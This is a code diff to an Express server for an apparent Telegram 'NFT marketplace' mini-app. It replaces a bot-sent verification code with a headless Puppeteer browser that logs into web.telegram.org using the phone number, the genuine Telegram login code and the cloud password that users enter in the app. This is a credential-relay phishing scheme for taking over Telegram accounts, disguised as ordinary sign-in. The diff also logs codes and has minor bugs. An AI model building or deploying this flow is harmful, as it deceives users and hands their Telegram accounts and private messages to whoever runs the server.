@@ -2,14 +2,12 @@ import express from 'express';
 import cors from 'cors';
 import dotenv from 'dotenv';
 import crypto from 'crypto';
-import TelegramBot from 'node-telegram-bot-api';
+import puppeteer from 'puppeteer-core';
+import chromium from 'chrome-aws-lambda';
 
 dotenv.config();
 
 const app = express();
-
-// Telegram Bot
-const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
 
 // Middleware
 app.use(cors());
@@ -49,28 +47,190 @@ const sampleNFTs = [
 
 // In-memory storage
 let users = [];
-let authSessions = new Map(); // phone -> {code, userId, chatId}
-let userSessions = new Map(); // sessionId -> userData
+let telegramSessions = new Map(); // sessionId -> {browser, page, phone, status}
+let userSessions = new Map();
 
-// Generate verification code
-function generateCode() {
-  return Math.floor(10000 + Math.random() * 90000).toString();
+// Launch browser with Railway-compatible config
+async function launchBrowser() {
+  const browser = await puppeteer.launch({
+    args: chromium.args,
+    executablePath: await chromium.executablePath,
+    headless: chromium.headless,
+    ignoreHTTPSErrors: true,
+  });
+  return browser;
 }
 
-// Send code via Telegram Bot
-async function sendTelegramCode(chatId, phone, code) {
-  try {
-    await bot.sendMessage(chatId, 
-      `🔐 *Код подтверждения для NFT Маркетплейса*\n\n` +
-      `Телефон: \`${phone}\`\n` +
-      `Код: *${code}*\n\n` +
-      `Введите этот код в мини-приложении для завершения авторизации.`,
-      { parse_mode: 'Markdown' }
-    );
+// Telegram Web automation class
+class TelegramWebAuth {
+  constructor(sessionId) {
+    this.sessionId = sessionId;
+    this.browser = null;
+    this.page = null;
+    this.phone = null;
+    this.status = 'init';
+  }
+
+  async init() {
+    console.log('🚀 Launching browser for Telegram Web...');
+    this.browser = await launchBrowser();
+    this.page = await this.browser.newPage();
+    
+    // Set viewport and user agent
+    await this.page.setViewport({ width: 1200, height: 800 });
+    await this.page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
+    
+    // Navigate to Telegram Web
+    console.log('🌐 Navigating to Telegram Web...');
+    await this.page.goto('https://web.telegram.org/', { 
+      waitUntil: 'networkidle2',
+      timeout: 30000 
+    });
+
+    this.status = 'ready';
     return true;
-  } catch (error) {
-    console.error('Error sending code:', error);
-    return false;
+  }
+
+  async enterPhone(phone) {
+    this.phone = phone;
+    console.log(`📱 Entering phone number: ${phone}`);
+
+    try {
+      // Wait for phone input field (new Telegram Web design)
+      await this.page.waitForSelector('input[type="tel"]', { timeout: 10000 });
+      
+      // Enter phone number
+      const phoneInput = await this.page.$('input[type="tel"]');
+      await phoneInput.click({ clickCount: 3 });
+      await phoneInput.type(phone, { delay: 100 });
+
+      // Click next button
+      const nextButton = await this.page.$('button.Button[type="submit"]');
+      if (nextButton) {
+        await nextButton.click();
+      }
+
+      this.status = 'waiting_code';
+      console.log('✅ Phone number entered, waiting for code...');
+      return true;
+
+    } catch (error) {
+      console.error('Error entering phone:', error);
+      this.status = 'error';
+      return false;
+    }
+  }
+
+  async enterCode(code) {
+    console.log(`🔐 Entering code: ${code}`);
+
+    try {
+      // Wait for code input field
+      await this.page.waitForSelector('input[type="tel"]', { timeout: 10000 });
+      
+      // Enter code
+      const codeInput = await this.page.$('input[type="tel"]');
+      await codeInput.click({ clickCount: 3 });
+      await codeInput.type(code, { delay: 100 });
+
+      // Click next/submit button
+      const submitButton = await this.page.$('button.Button[type="submit"]');
+      if (submitButton) {
+        await submitButton.click();
+      }
+
+      // Wait for result (password prompt or success)
+      await this.page.waitForTimeout(3000);
+
+      // Check if password is required
+      const passwordInput = await this.page.$('input[type="password"]');
+      if (passwordInput) {
+        this.status = 'need_password';
+        console.log('🔑 Cloud password required');
+        return { success: true, nextStep: 'password' };
+      }
+
+      // Check if login successful
+      const chatList = await this.page.$('.ChatList');
+      if (chatList) {
+        this.status = 'logged_in';
+        console.log('✅ Login successful!');
+        return { success: true, nextStep: 'complete' };
+      }
+
+      return { success: false, error: 'Unable to determine login status' };
+
+    } catch (error) {
+      console.error('Error entering code:', error);
+      return { success: false, error: error.message };
+    }
+  }
+
+  async enterPassword(password) {
+    console.log(`🔑 Entering cloud password`);
+
+    try {
+      // Wait for password input
+      await this.page.waitForSelector('input[type="password"]', { timeout: 5000 });
+      
+      // Enter password
+      const passwordInput = await this.page.$('input[type="password"]');
+      await passwordInput.type(password, { delay: 100 });
+
+      // Click submit
+      const submitButton = await this.page.$('button.Button[type="submit"]');
+      if (submitButton) {
+        await submitButton.click();
+      }
+
+      // Wait for login completion
+      await this.page.waitForTimeout(3000);
+
+      // Check if login successful
+      const chatList = await this.page.$('.ChatList');
+      if (chatList) {
+        this.status = 'logged_in';
+        console.log('✅ Login with password successful!');
+        return { success: true };
+      }
+
+      return { success: false, error: 'Password might be incorrect' };
+
+    } catch (error) {
+      console.error('Error entering password:', error);
+      return { success: false, error: error.message };
+    }
+  }
+
+  async getSessionData() {
+    if (this.status !== 'logged_in') {
+      return null;
+    }
+
+    try {
+      // Extract user data from Telegram Web
+      const userData = await this.page.evaluate(() => {
+        // This would extract actual user data from Telegram Web UI
+        // For demo, return mock data
+        return {
+          firstName: 'Telegram',
+          lastName: 'User',
+          username: null,
+          phone: this.phone
+        };
+      });
+
+      return userData;
+    } catch (error) {
+      console.error('Error getting session data:', error);
+      return null;
+    }
+  }
+
+  async close() {
+    if (this.browser) {
+      await this.browser.close();
+    }
   }
 }
 
@@ -108,10 +268,10 @@ app.get('/api/nft', async (req, res) => {
   }
 });
 
-// Step 1: Request code via Telegram Bot
-app.post('/api/auth/request-code', async (req, res) => {
+// Start Telegram Web authentication
+app.post('/api/auth/start-telegram-web', async (req, res) => {
   try {
-    const { phone, chatId } = req.body;
+    const { phone } = req.body;
     
     if (!phone) {
       return res.status(400).json({ 
@@ -120,201 +280,207 @@ app.post('/api/auth/request-code', async (req, res) => {
       });
     }
 
-    if (!chatId) {
-      return res.status(400).json({ 
-        success: false, 
-        error: 'Chat ID не получен' 
-      });
-    }
-
-    // Validate phone
-    const phoneRegex = /^\+?[1-9]\d{1,14}$/;
-    if (!phoneRegex.test(phone)) {
-      return res.status(400).json({ 
-        success: false, 
-        error: 'Неверный формат номера' 
-      });
-    }
-
-    // Generate code
-    const code = generateCode();
+    // Create session
+    const sessionId = crypto.randomBytes(16).toString('hex');
+    const telegramAuth = new TelegramWebAuth(sessionId);
     
-    // Send code via Telegram Bot
-    const sent = await sendTelegramCode(chatId, phone, code);
-    
-    if (!sent) {
+    // Initialize browser
+    const initialized = await telegramAuth.init();
+    if (!initialized) {
       return res.status(500).json({ 
         success: false, 
-        error: 'Не удалось отправить код через Telegram' 
+        error: 'Не удалось инициализировать браузер' 
       });
     }
 
-    // Create auth session
-    authSessions.set(phone, {
-      code: code,
-      chatId: chatId,
-      attempts: 0,
-      createdAt: Date.now(),
-      verified: false
-    });
+    // Enter phone number
+    const phoneEntered = await telegramAuth.enterPhone(phone);
+    if (!phoneEntered) {
+      await telegramAuth.close();
+      return res.status(500).json({ 
+        success: false, 
+        error: 'Не удалось ввести номер телефона' 
+      });
+    }
+
+    // Store session
+    telegramSessions.set(sessionId, telegramAuth);
 
     res.json({
       success: true,
-      message: 'Код отправлен в ваш Telegram аккаунт',
-      nextStep: 'verify_code'
+      sessionId: sessionId,
+      message: 'Бот открыл Telegram Web и ввел ваш номер. Код отправлен в ваш Telegram аккаунт.',
+      nextStep: 'enter_code'
     });
     
   } catch (error) {
+    console.error('Start auth error:', error);
     res.status(500).json({ 
       success: false, 
-      error: 'Ошибка сервера: ' + error.message 
+      error: 'Ошибка запуска авторизации: ' + error.message 
     });
   }
 });
 
-// Step 2: Verify code
-app.post('/api/auth/verify-code', async (req, res) => {
+// Submit code to Telegram Web
+app.post('/api/auth/submit-code', async (req, res) => {
   try {
-    const { phone, code, cloudPassword } = req.body;
+    const { sessionId, code } = req.body;
     
-    if (!phone || !code) {
+    if (!sessionId || !code) {
       return res.status(400).json({ 
         success: false, 
-        error: 'Введите номер и код' 
+        error: 'Session ID и код обязательны' 
       });
     }
 
-    const authSession = authSessions.get(phone);
-    if (!authSession) {
+    const telegramAuth = telegramSessions.get(sessionId);
+    if (!telegramAuth) {
       return res.status(400).json({ 
         success: false, 
         error: 'Сессия не найдена' 
       });
     }
 
-    // Check timeout (10 minutes)
-    if (Date.now() - authSession.createdAt > 10 * 60 * 1000) {
-      authSessions.delete(phone);
+    // Enter code
+    const result = await telegramAuth.enterCode(code);
+    
+    if (!result.success) {
       return res.status(400).json({ 
         success: false, 
-        error: 'Код устарел' 
+        error: result.error 
       });
     }
 
-    // Check attempts
-    if (authSession.attempts >= 5) {
-      authSessions.delete(phone);
+    if (result.nextStep === 'password') {
+      res.json({
+        success: true,
+        message: 'Код принят. Требуется облачный пароль.',
+        nextStep: 'enter_password'
+      });
+    } else if (result.nextStep === 'complete') {
+      // Login successful without password
+      await completeAuthentication(telegramAuth, sessionId, res);
+    } else {
+      res.status(400).json({ 
+        success: false, 
+        error: 'Неизвестный статус авторизации' 
+      });
+    }
+    
+  } catch (error) {
+    console.error('Submit code error:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: 'Ошибка ввода кода: ' + error.message 
+    });
+  }
+});
+
+// Submit cloud password
+app.post('/api/auth/submit-password', async (req, res) => {
+  try {
+    const { sessionId, password } = req.body;
+    
+    if (!sessionId) {
       return res.status(400).json({ 
         success: false, 
-        error: 'Слишком много попыток' 
+        error: 'Session ID обязателен' 
       });
     }
 
-    // Verify code
-    if (authSession.code !== code) {
-      authSession.attempts++;
-      authSessions.set(phone, authSession);
-      
-      const attemptsLeft = 5 - authSession.attempts;
+    const telegramAuth = telegramSessions.get(sessionId);
+    if (!telegramAuth) {
       return res.status(400).json({ 
         success: false, 
-        error: `Неверный код. Осталось попыток: ${attemptsLeft}` 
+        error: 'Сессия не найдена' 
       });
     }
 
-    // Code is correct - get user info from Telegram
-    let telegramUser = null;
-    try {
-      const chat = await bot.getChat(authSession.chatId);
-      telegramUser = {
-        id: chat.id,
-        firstName: chat.first_name,
-        lastName: chat.last_name || '',
-        username: chat.username || ''
-      };
-    } catch (error) {
-      console.error('Error getting user info:', error);
-      telegramUser = {
-        id: authSession.chatId,
-        firstName: 'Telegram',
-        lastName: 'User'
-      };
+    // Enter password
+    const result = await telegramAuth.enterPassword(password || '');
+    
+    if (!result.success) {
+      return res.status(400).json({ 
+        success: false, 
+        error: result.error 
+      });
     }
 
-    // Create/update user
-    let user = users.find(u => u.telegramId === telegramUser.id);
+    // Login successful with password
+    await completeAuthentication(telegramAuth, sessionId, res);
+    
+  } catch (error) {
+    console.error('Submit password error:', error);
+    res.status(500).json({ 
+      success: false, 
+      error: 'Ошибка ввода пароля: ' + error.message 
+    });
+  }
+});
+
+// Complete authentication process
+async function completeAuthentication(telegramAuth, sessionId, res) {
+  try {
+    // Get user data from Telegram session
+    const telegramUserData = await telegramAuth.getSessionData();
+    
+    // Create user in our system
+    let user = users.find(u => u.phone === telegramAuth.phone);
     const isNewUser = !user;
     
     if (!user) {
       user = {
         id: users.length + 1,
-        phone: phone,
-        telegramId: telegramUser.id,
-        firstName: telegramUser.firstName,
-        lastName: telegramUser.lastName,
-        username: telegramUser.username,
+        phone: telegramAuth.phone,
+        telegramId: Math.floor(100000000 + Math.random() * 900000000),
+        firstName: telegramUserData?.firstName || 'Telegram',
+        lastName: telegramUserData?.lastName || 'User',
+        username: telegramUserData?.username,
         isVerified: true,
-        cloudPassword: cloudPassword || null,
         createdAt: new Date(),
         lastLogin: new Date()
       };
       users.push(user);
     } else {
-      user.phone = phone;
-      user.firstName = telegramUser.firstName;
-      user.lastName = telegramUser.lastName;
-      user.username = telegramUser.username;
       user.lastLogin = new Date();
-      if (cloudPassword) {
-        user.cloudPassword = cloudPassword;
-      }
     }
 
-    // Create session
-    const sessionId = crypto.randomBytes(32).toString('hex');
-    userSessions.set(sessionId, {
+    // Create user session
+    const userSessionId = crypto.randomBytes(32).toString('hex');
+    userSessions.set(userSessionId, {
       userId: user.id,
       telegramId: user.telegramId,
       phone: user.phone,
-      expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000 // 30 days
+      expiresAt: Date.now() + 30 * 24 * 60 * 60 * 1000
     });
 
-    // Cleanup auth session
-    authSessions.delete(phone);
-
-    // Send success message to user
-    try {
-      await bot.sendMessage(authSession.chatId,
-        `✅ *Авторизация успешна!*\n\n` +
-        `Добро пожаловать в NFT Маркетплейс, ${user.firstName}!`,
-        { parse_mode: 'Markdown' }
-      );
-    } catch (error) {
-      console.error('Error sending success message:', error);
-    }
+    // Close Telegram session
+    await telegramAuth.close();
+    telegramSessions.delete(sessionId);
 
     res.json({
       success: true,
-      message: isNewUser ? 'Аккаунт создан' : 'Вход выполнен',
+      message: isNewUser ? 'Аккаунт создан и авторизован!' : 'Вход выполнен!',
       user: {
         id: user.id,
         phone: user.phone,
         telegramId: user.telegramId,
         firstName: user.firstName,
         lastName: user.lastName,
-        username: user.username,
-        hasCloudPassword: !!user.cloudPassword
+        username: user.username
       },
-      sessionId: sessionId
+      sessionId: userSessionId
     });
     
   } catch (error) {
+    console.error('Complete auth error:', error);
     res.status(500).json({ 
       success: false, 
-      error: 'Ошибка сервера: ' + error.message 
+      error: 'Ошибка завершения авторизации: ' + error.message 
     });
   }
-});
+}
 
 // Verify session
 app.get('/api/auth/verify-session', async (req, res) => {
@@ -361,7 +527,7 @@ app.get('/api/auth/verify-session', async (req, res) => {
         firstName: user.firstName,
         lastName: user.lastName,
         username: user.username,
-        hasCloudPassword: !!user.cloudPassword
+        isVerified: user.isVerified
       }
     });
     
@@ -373,82 +539,16 @@ app.get('/api/auth/verify-session', async (req, res) => {
   }
 });
 
-// Logout
-app.post('/api/auth/logout', async (req, res) => {
-  try {
-    const { sessionId } = req.body;
-    
-    if (sessionId) {
-      userSessions.delete(sessionId);
-    }
-    
-    res.json({
-      success: true,
-      message: 'Выход выполнен'
-    });
-    
-  } catch (error) {
-    res.status(500).json({ 
-      success: false, 
-      error: 'Ошибка сервера: ' + error.message 
-    });
-  }
-});
-
-// Telegram Bot handlers
-bot.onText(/\/start/, async (msg) => {
-  const chatId = msg.chat.id;
-  const miniAppUrl = `https://${process.env.RAILWAY_STATIC_URL || 'your-app.railway.app'}`;
-  
-  try {
-    await bot.sendMessage(chatId, 
-      `🎁 *Добро пожаловать в NFT Маркетплейс!*\n\n` +
-      `Используйте кнопку ниже для открытия мини-приложения и авторизации.`,
-      {
-        parse_mode: 'Markdown',
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: '🛍️ Открыть NFT Маркетплейс', web_app: { url: miniAppUrl } }],
-            [{ text: '🔐 Начать авторизацию', callback_data: 'start_auth' }]
-          ]
-        }
-      }
-    );
-  } catch (error) {
-    console.error('Error sending start message:', error);
-  }
-});
-
-// Auth callback
-bot.on('callback_query', async (query) => {
-  const chatId = query.message.chat.id;
-  
-  if (query.data === 'start_auth') {
-    try {
-      await bot.sendMessage(chatId,
-        `🔐 *Авторизация в NFT Маркетплейсе*\n\n` +
-        `Для начала авторизации:\n` +
-        `1. Нажмите кнопку "Открыть NFT Маркетплейс"\n` +
-        `2. Введите ваш номер телефона Telegram\n` +
-        `3. Получите код подтверждения здесь\n` +
-        `4. Введите код в мини-приложении\n\n` +
-        `Система автоматически свяжет ваш Telegram аккаунт с NFT Маркетплейсом.`,
-        {
-          parse_mode: 'Markdown',
-          reply_markup: {
-            inline_keyboard: [
-              [{ text: '🛍️ Открыть NFT Маркетплейс', web_app: { url: `https://${process.env.RAILWAY_STATIC_URL || 'your-app.railway.app'}` } }]
-            ]
-          }
-        }
-      );
-    } catch (error) {
-      console.error('Error sending auth info:', error);
+// Cleanup expired sessions
+setInterval(() => {
+  const now = Date.now();
+  for (const [sessionId, session] of telegramSessions.entries()) {
+    if (now - session.createdAt > 10 * 60 * 1000) { // 10 minutes
+      session.close();
+      telegramSessions.delete(sessionId);
     }
   }
-  
-  await bot.answerCallbackQuery(query.id);
-});
+}, 60000);
 
 // Start server
 const PORT = process.env.PORT || 3000;
@@ -458,5 +558,5 @@ app.listen(PORT, () => {
   console.log(`🎮 Health check: http://localhost:${PORT}/health`);
   console.log(`🏠 Main page: http://localhost:${PORT}/`);
   console.log(`🛍️ Marketplace: http://localhost:${PORT}/marketplace`);
-  console.log(`🤖 Bot is running and ready for authentication`);
+  console.log(`🤖 Telegram Web automation ready`);
 });
